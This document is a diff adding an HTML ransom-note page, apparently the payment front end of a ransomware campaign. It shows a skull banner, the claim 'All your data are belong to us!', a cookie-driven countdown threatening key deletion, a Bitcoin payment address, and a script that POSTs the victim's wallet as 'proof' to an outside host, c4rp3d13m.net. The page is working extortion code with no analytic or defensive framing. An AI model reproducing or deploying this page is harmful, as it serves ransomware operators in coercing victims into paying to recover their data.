@@ -1,0 +1,87 @@
+<!DOCTYPE html><html><head><title>Home</title><link rel="stylesheet" href="/stylesheets/style.css"></head><body><div class="main container"><div class="row"></div><center><h1>Carpe Diem</h1><h3>All your data are belong to us!</h3><p></p><p><pre>   uu$:$:$:$:$:$uu
+    uu$$$$$$$$$$$$$$$$$uu
+   u$$$$$$$$$$$$$$$$$$$$$u
+   u$$$$$$$$$$$$$$$$$$$$$$$u
+   u$$$$$$$$$$$$$$$$$$$$$$$$$u
+  u$$$$$$$$$$$$$$$$$$$$$$$$$u
+  u$$$$$$*   *$$$*   *$$$$$$u
+  $$$$*      u$u       $$$$*
+  $$$u       u$u       u$$$
+  $$$u      u$$$u      u$$$
+  *$$$$uu$$$   $$$uu$$$$*
+  *$$$$$$$*   *$$$$$$$*
+   u$$$$$$$u$$$$$$$u
+   u$*$*$*$*$*$*$u
+  uuu        $$u$ $ $ $ $u$$       uuu
+ u$$$$        $$u$u$u$u$u$$       u$$$$
+  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
+u$$$$$$$$$$$      *****    uuuu$$$$$$$$$
+$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
+ ***      **$$$$$$$$$$$uu **$***
+          uuuu **$$$$$$$$$$uuu
+ u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
+ $$$$$$$$$$****           **$$$$$$$$$$$*
+   *$$$$$*                      **$$$$** </pre><h4></h4><h2>Your key will be deleted:</h2><h3>Sun May 03 2026 18:12:21 GMT+0000</h3><div id="counter"></div><script>function aaa(wallet) {
+  var wallet = wallet;
+  if (wallet.trim() === 'bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hj'){
+    alert('Hey! \n\nstupid is as stupid does...');
+    return;
+  }
+
+var re = new RegExp("^([a-z0-9]{42,42})$");
+if (re.test(wallet.trim())) {
+  var http = new XMLHttpRequest();
+  var url = 'http://c4rp3d13m.net/proof/';
+  http.open('POST', url, true);
+  http.setRequestHeader('Content-type', 'application/json');
+  var d = '{"size":42,"proof":"'+wallet+'"}';
+  http.onreadystatechange = function() {
+  if(http.readyState == 4 && http.status == 200) {
+    //alert(http.responseText);
+    }
+    }
+      http.send(d);
+    } else {
+    alert('Invalid wallet!');
+    }
+    }
+</script><script>function clippy() {
+var copyText = document.getElementById("pay");
+copyText.select();
+copyText.setSelectionRange(0, 99999)
+document.execCommand("copy");
+alert("Copied: " + copyText.value);
+}</script><script>// Set the date we're counting down to
+var countdown = document.cookie
+var countdown = countdown.replace(/%3A/g, ":");
+var countdown = countdown.replace("countdown=", "");
+
+var countDownDate = new Date(countdown);
+countDownDate.setHours(countDownDate.getHours() + 8);
+countDownDate = new Date(countDownDate).getTime();
+
+// Update the count down every 1 second
+var x = setInterval(function() {
+
+ // Get today's date and time
+var now = new Date().getTime();
+
+// Find the distance between now and the count down date
+var distance = countDownDate - now;
+
+// Time calculations for days, hours, minutes and seconds
+var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+// Output the result in an element with id="demo"
+document.getElementById("counter").innerHTML = days + "d " + hours + "h "+ minutes + "m " + seconds + "s ";
+
+// If the count down is over, write some text
+if (distance < 0) {
+clearInterval(x);
+document.getElementById("counter").innerHTML = "KEY DELETED. YOU SHOULD HAVE PAYED!";
+}
+}, 1000);
+</script><div class="col-md-6 col-md-offset-3"><h1 class="display-4 m-b-2"></h1><form></form><table><tr><td><label for="pay">BTC:</label></td><td><input type="text" id="pay" value="bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hj" name="pay" readonly class="form-control"></td><td><button type="button" onclick="clippy(pay.value)" class="btn btn-primary">Copy</button></td></tr><tr><td><label for="receipt">Proof:</label></td><td><input type="text" id="wallet" placeholder="Your wallet" name="wallet" class="form-control"></td><td><button type="button" onclick="aaa(wallet.value)" class="btn btn-primary">Send</button></td></tr></table><p></p></div></p></center></div></body></html>
